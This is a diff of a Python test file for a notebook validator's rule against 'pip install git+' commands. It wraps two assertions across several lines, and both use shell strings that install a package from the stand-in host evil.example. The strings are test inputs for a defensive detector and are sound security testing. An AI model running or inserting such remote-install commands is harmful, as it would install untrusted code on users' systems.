@@ -4361,8 +4361,18 @@ def test_a_terminator_inside_a_brace_group_ends_the_line():
     """
     nv = _load_notebook_validator_module()
 
-    assert nv.rule_inst_001_git_plus("!{ exit; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0) == []
-    assert nv.rule_inst_001_git_plus("!{ exec true; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!{ exit; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0
+        )
+        == []
+    )
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!{ exec true; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0
+        )
+        == []
+    )
     # A SUBSHELL exits only itself, so the parent still reaches the install.
     assert [
         f.rule
